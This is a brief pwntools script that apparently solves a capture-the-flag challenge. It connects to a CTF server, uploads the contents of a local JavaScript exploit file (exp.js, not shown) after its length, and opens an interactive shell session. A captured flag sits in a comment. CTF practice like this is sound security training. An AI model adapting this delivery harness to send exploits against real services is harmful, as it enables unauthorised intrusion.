from pwn import *

r = remote('edu-ctf.zoolab.org', 30219)

f = open('./exp.js', 'rb')
payload = f.read()

length = len(payload)
r.sendlineafter(b'> ', str(length))
r.sendline(payload)

r.interactive()
# FLAG{nlnlOUO_nlnlSoFun}